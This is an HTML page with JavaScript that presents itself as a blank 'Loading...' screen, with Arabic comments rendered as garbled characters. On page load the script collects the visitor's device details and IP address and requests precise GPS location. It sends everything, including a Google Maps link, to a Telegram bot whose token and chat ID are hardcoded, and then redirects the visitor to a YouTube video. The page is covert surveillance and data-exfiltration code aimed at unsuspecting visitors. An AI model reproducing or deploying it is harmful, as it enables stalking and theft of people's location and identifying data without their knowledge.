<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: white;
            font-family: Arial, sans-serif;
            height: 100vh;
            overflow: hidden;
        }

        .hidden-content {
            display: none;
            position: absolute;
            top: -9999px;
            left: -9999px;
            opacity: 0;
            visibility: hidden;
        }
    </style>
</head>
<body>
    <div class="hidden-content" id="hiddenStatus">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...</div>

    <script>
        // =============================================================================
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… - ØªØ£ÙƒØ¯ Ù…Ù† ØµØ­Ø© Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        // =============================================================================
        
        const REDIRECT_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
        const BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
        const CHAT_ID = '170383339';
        const MAX_WAIT_TIME = 3000; // Ø²ÙŠØ§Ø¯Ø© Ø§Ù„ÙˆÙ‚Øª Ù‚Ù„ÙŠÙ„Ø§Ù‹
        
        // =============================================================================
        
        let dataCollected = false;
        let sendingData = false;
        
        function log(message) {
            console.log(`ğŸ”§ ${new Date().toLocaleTimeString()} - ${message}`);
        }
        
        // Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
        function collectBasicData() {
            const ua = navigator.userAgent;
            const now = new Date();
            
            const basicData = {
                userAgent: ua,
                timestamp: now.toISOString(),
                localTime: now.toLocaleString('ar-SA', {
                    timeZone: 'Asia/Baghdad',
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                }),
                url: window.location.href,
                referrer: document.referrer || 'Ù…Ø¨Ø§Ø´Ø±',
                language: navigator.language,
                platform: navigator.platform,
                screenRes: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceType: /iPhone/i.test(ua) ? 'iPhone' : 
                           /iPad/i.test(ua) ? 'iPad' : 
                           /Android/i.test(ua) ? 'Android' : 
                           /Windows/i.test(ua) ? 'Windows' : 
                           /Mac/i.test(ua) ? 'Mac' : 'Ù…Ø¬Ù‡ÙˆÙ„',
                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                        /Firefox/i.test(ua) ? 'Firefox' :
                        /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                        /Edge/i.test(ua) ? 'Edge' : 'Ù…Ø¬Ù‡ÙˆÙ„'
            };
            
            log('Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©: ' + JSON.stringify(basicData, null, 2));
            return basicData;
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IP - Ù…Ø­Ø¯Ø« ÙˆÙ…ÙØ­Ø³Ù†
        async function getIP() {
            log('ğŸŒ Ø¨Ø¯Ø¡ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IP...');
            
            const services = [
                {
                    url: 'https://api.ipify.org?format=json',
                    parser: (data) => data.ip
                },
                {
                    url: 'https://httpbin.org/ip',
                    parser: (data) => data.origin
                },
                {
                    url: 'https://api.myip.com',
                    parser: (data) => data.ip
                },
                {
                    url: 'https://ipapi.co/json/',
                    parser: (data) => data.ip
                }
            ];
            
            for (let service of services) {
                try {
                    log(`Ù…Ø­Ø§ÙˆÙ„Ø© ${service.url}`);
                    
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 2000);
                    
                    const response = await fetch(service.url, {
                        method: 'GET',
                        signal: controller.signal,
                        headers: {
                            'Accept': 'application/json',
                            'User-Agent': 'Mozilla/5.0 (compatible; DataCollector/1.0)'
                        },
                        mode: 'cors'
                    });
                    
                    clearTimeout(timeoutId);
                    
                    if (response.ok) {
                        const data = await response.json();
                        const ip = service.parser(data);
                        
                        if (ip && ip !== 'undefined') {
                            log(`âœ… IP Ù…Ø­ØµÙ„: ${ip} Ù…Ù† ${service.url}`);
                            return ip;
                        }
                    }
                    
                } catch (error) {
                    log(`âŒ ÙØ´Ù„ ${service.url}: ${error.message}`);
                    continue;
                }
            }
            
            log('âŒ ÙØ´Ù„ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IP Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø®Ø¯Ù…Ø§Øª');
            return 'ØºÙŠØ± Ù…ØªØ§Ø­';
        }
        
        // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ - Ù…Ø­Ø¯Ø«
        function getLocation() {
            return new Promise((resolve) => {
                log('ğŸ“ Ø¨Ø¯Ø¡ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹...');
                
                if (!navigator.geolocation) {
                    log('âŒ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹');
                    resolve(null);
                    return;
                }
                
                let resolved = false;
                let attempts = 0;
                
                function handleSuccess(position) {
                    if (!resolved) {
                        resolved = true;
                        const location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy)
                        };
                        log(`âœ… Ù…ÙˆÙ‚Ø¹ Ù…Ø­ØµÙ„: ${location.latitude}, ${location.longitude} (Ø¯Ù‚Ø©: ${location.accuracy}Ù…)`);
                        resolve(location);
                    }
                }
                
                function handleError(error) {
                    attempts++;
                    log(`âŒ Ø®Ø·Ø£ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ${attempts}: ${error.code} - ${error.message}`);
                    
                    if (attempts >= 2 && !resolved) {
                        resolved = true;
                        resolve(null);
                    }
                }
                
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø£ÙˆÙ„Ù‰ - Ø¯Ù‚Ø© Ø¹Ø§Ù„ÙŠØ©
                navigator.geolocation.getCurrentPosition(
                    handleSuccess,
                    handleError,
                    {
                        enableHighAccuracy: true,
                        timeout: 2000,
                        maximumAge: 30000
                    }
                );
                
                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø«Ø§Ù†ÙŠØ© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØ© ÙˆØ§Ø­Ø¯Ø©
                setTimeout(() => {
                    if (!resolved) {
                        log('ğŸ”„ Ù…Ø­Ø§ÙˆÙ„Ø© Ø«Ø§Ù†ÙŠØ© Ù„Ù„Ù…ÙˆÙ‚Ø¹...');
                        navigator.geolocation.getCurrentPosition(
                            handleSuccess,
                            handleError,
                            {
                                enableHighAccuracy: false,
                                timeout: 1500,
                                maximumAge: 60000
                            }
                        );
                    }
                }, 1000);
                
                // Ø§Ù†ØªÙ‡Ø§Ø¡ Ø§Ù„Ù…Ù‡Ù„Ø© Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©
                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        log('â° Ø§Ù†ØªÙ‡Øª Ù…Ù‡Ù„Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹');
                        resolve(null);
                    }
                }, 2500);
            });
        }
        
        // Ø¥Ù†Ø´Ø§Ø¡ Ø±Ø§Ø¨Ø· Google Maps
        function createMapsLink(lat, lng) {
            return `https://www.google.com/maps/dir//${lat},${lng}/@${lat},${lng},272m/data=!3m1!1e3`;
        }
        
        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª - Ù…Ø­Ø¯Ø« ÙˆÙ…ÙØ­Ø³Ù†
        async function sendData(data) {
            if (sendingData) {
                log('âš ï¸ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù‚ÙŠØ¯ Ø§Ù„ØªÙ‚Ø¯Ù… Ø¨Ø§Ù„ÙØ¹Ù„');
                return false;
            }
            
            sendingData = true;
            log('ğŸ“¤ Ø¨Ø¯Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...');
            
            let locationText = 'ØºÙŠØ± Ù…ØªØ§Ø­';
            let mapsLink = '';
            
            if (data.location) {
                const { latitude, longitude, accuracy } = data.location;
                locationText = `${latitude.toFixed(6)}, ${longitude.toFixed(6)} (Ø¯Ù‚Ø©: ${accuracy}Ù…)`;
                mapsLink = createMapsLink(latitude, longitude);
            }
            
            const message = `ğŸ¯ Ø²Ø§Ø¦Ø± Ø¬Ø¯ÙŠØ¯ (Ù†Ø¸Ø§Ù… Ù…Ø­Ø¯Ø«):
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
â° Ø§Ù„ÙˆÙ‚Øª: ${data.device.localTime}
ğŸŒ Ø§Ù„Ø±Ø§Ø¨Ø·: ${data.device.url}
ğŸ”— Ø§Ù„Ù…Ø±Ø¬Ø¹: ${data.device.referrer}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${data.device.deviceType} | ${data.device.browser}
ğŸ“± Ù‡Ø§ØªÙ Ù…Ø­Ù…ÙˆÙ„: ${data.device.isMobile ? 'Ù†Ø¹Ù…' : 'Ù„Ø§'}
ğŸŒ Ø¹Ù†ÙˆØ§Ù† IP: ${data.ip}
ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${locationText}
${mapsLink ? `ğŸ—ºï¸ Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø©: ${mapsLink}` : ''}
ğŸ—£ï¸ Ø§Ù„Ù„ØºØ©: ${data.device.language}
ğŸŒ Ø§Ù„Ù…Ù†Ø·Ù‚Ø© Ø§Ù„Ø²Ù…Ù†ÙŠØ©: ${data.device.timezone}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± Ø§Ù„Ø´Ø§Ø´Ø©: ${data.device.screenRes}
ğŸªŸ Ø§Ù„Ù†Ø§ÙØ°Ø©: ${data.device.windowSize}
ğŸ–¥ï¸ Ø§Ù„Ù†Ø¸Ø§Ù…: ${data.device.platform}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ” User Agent:
${data.device.userAgent}`;
            
            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CHAT_ID,
                text: message,
                disable_web_page_preview: false,
                parse_mode: 'HTML'
            };
            
            log('ğŸ“ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ù…ÙØ±Ø³Ù„Ø©: ' + message.substring(0, 100) + '...');
            
            // Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ù…ØªØ¹Ø¯Ø¯Ø© Ù„Ù„Ø¥Ø±Ø³Ø§Ù„
            for (let attempt = 1; attempt <= 5; attempt++) {
                try {
                    log(`ğŸ“¤ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ ${attempt}/5`);
                    
                    const response = await fetch(telegramUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify(payload),
                        mode: 'cors'
                    });
                    
                    log(`ğŸ“¡ Ø§Ø³ØªØ¬Ø§Ø¨Ø© Ø§Ù„Ø®Ø§Ø¯Ù…: ${response.status} ${response.statusText}`);
                    
                    if (response.ok) {
                        const result = await response.json();
                        log('ğŸ“‹ Ù†ØªÙŠØ¬Ø© Telegram: ' + JSON.stringify(result));
                        
                        if (result.ok) {
                            log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© Ø¨Ù†Ø¬Ø§Ø­!');
                            dataCollected = true;
                            
                            // Ø¥Ø±Ø³Ø§Ù„ Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù…Ù†ÙØµÙ„
                            if (mapsLink) {
                                try {
                                    const mapResponse = await fetch(telegramUrl, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            chat_id: CHAT_ID,
                                            text: `ğŸ—ºï¸ Ø±Ø§Ø¨Ø· Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù…Ø¨Ø§Ø´Ø±:\n${mapsLink}`,
                                            disable_web_page_preview: false
                                        })
                                    });
                                    
                                    if (mapResponse.ok) {
                                        log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø©!');
                                    }
                                } catch (e) {
                                    log('âš ï¸ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø©: ' + e.message);
                                }
                            }
                            
                            sendingData = false;
                            return true;
                        } else {
                            log(`âŒ Ø®Ø·Ø£ Telegram: ${result.description}`);
                        }
                    } else {
                        const errorText = await response.text();
                        log(`âŒ ÙØ´Ù„ HTTP: ${response.status} - ${errorText}`);
                    }
                    
                } catch (error) {
                    log(`âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ ${attempt}: ${error.name} - ${error.message}`);
                    
                    if (error.name === 'TypeError' && error.message.includes('Failed to fetch')) {
                        log('ğŸš« Ù…Ø´ÙƒÙ„Ø© ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ - CORS Ø£Ùˆ Network');
                    }
                }
                
                // Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ø¨Ù„ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ØªØ§Ù„ÙŠØ©
                if (attempt < 5) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
            
            log('âŒ ÙØ´Ù„ ÙÙŠ Ø¬Ù…ÙŠØ¹ Ù…Ø­Ø§ÙˆÙ„Ø§Øª Ø§Ù„Ø¥Ø±Ø³Ø§Ù„');
            sendingData = false;
            return false;
        }
        
        // Ø§Ù„ØªØ­ÙˆÙŠÙ„
        function redirect() {
            log('ğŸ”„ ØªØ­ÙˆÙŠÙ„ Ø¥Ù„Ù‰: ' + REDIRECT_URL);
            try {
                window.location.replace(REDIRECT_URL);
            } catch (error) {
                log('âš ï¸ ÙØ´Ù„ Ø§Ù„ØªØ­ÙˆÙŠÙ„ØŒ Ù…Ø­Ø§ÙˆÙ„Ø© Ø¨Ø¯ÙŠÙ„Ø©...');
                window.location.href = REDIRECT_URL;
            }
        }
        
        // Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
        async function main() {
            log('ğŸš€ Ø¨Ø¯Ø¡ Ø§Ù„Ù†Ø¸Ø§Ù… ÙÙŠ ' + new Date().toLocaleTimeString());
            
            try {
                // Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
                const basicData = collectBasicData();
                log('âœ… ØªÙ… Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©');
                
                // Ø¬Ù…Ø¹ IP ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹
                log('ğŸ”„ Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ IP ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹...');
                
                const startTime = Date.now();
                const [ip, location] = await Promise.allSettled([
                    getIP(),
                    getLocation()
                ]);
                
                const endTime = Date.now();
                log(`â±ï¸ ÙˆÙ‚Øª Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª: ${endTime - startTime}ms`);
                
                const fullData = {
                    device: basicData,
                    ip: ip.status === 'fulfilled' ? ip.value : 'ØºÙŠØ± Ù…ØªØ§Ø­',
                    location: location.status === 'fulfilled' ? location.value : null
                };
                
                log('ğŸ“Š Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠØ©: ' + JSON.stringify({
                    ip: fullData.ip,
                    location: fullData.location,
                    device: fullData.device.deviceType
                }));
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø¹ Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ù†ØªÙŠØ¬Ø©
                log('ğŸ“¤ Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...');
                const sendResult = await sendData(fullData);
                
                if (sendResult) {
                    log('âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­ - Ø§Ù„ØªØ­ÙˆÙŠÙ„ Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØªÙŠÙ†');
                    setTimeout(redirect, 2000);
                } else {
                    log('âŒ ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ - Ø§Ù„ØªØ­ÙˆÙŠÙ„ ÙÙˆØ±ÙŠ');
                    redirect();
                }
                
            } catch (error) {
                log('âŒ Ø®Ø·Ø£ Ø¹Ø§Ù… ÙÙŠ Ø§Ù„Ù†Ø¸Ø§Ù…: ' + error.message);
                redirect();
            }
        }
        
        // Ø¨Ø¯Ø¡ Ø§Ù„Ù†Ø¸Ø§Ù…
        log('ğŸ”§ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù†Ø¸Ø§Ù…...');
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', main);
        } else {
            setTimeout(main, 100);
        }
        
        // Ø­Ù…Ø§ÙŠØ© Ù…Ù† Ø§Ù„ØªØ¹Ù„ÙŠÙ‚
        setTimeout(() => {
            if (!window.location.href.includes('youtube.com')) {
                log('â° ØªØ­ÙˆÙŠÙ„ Ø§Ø¶Ø·Ø±Ø§Ø±ÙŠ Ø¨Ø¹Ø¯ 8 Ø«ÙˆØ§Ù†ÙŠ');
                redirect();
            }
        }, 8000);
        
        // ØªØ­ÙˆÙŠÙ„ ÙÙˆØ±ÙŠ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù†Ø§ÙØ°Ø©
        window.addEventListener('load', () => {
            setTimeout(() => {
                if (!dataCollected && !window.location.href.includes('youtube.com')) {
                    log('âš¡ ØªØ­ÙˆÙŠÙ„ Ø³Ø±ÙŠØ¹ Ù…Ù† window.load');
                    redirect();
                }
            }, 200);
        });
        
        log('ğŸ¯ Ø§Ù„Ù†Ø¸Ø§Ù… Ù…Ø­Ù…Ù„ ÙˆÙ…Ø³ØªØ¹Ø¯');
    </script>
</body>
</html>
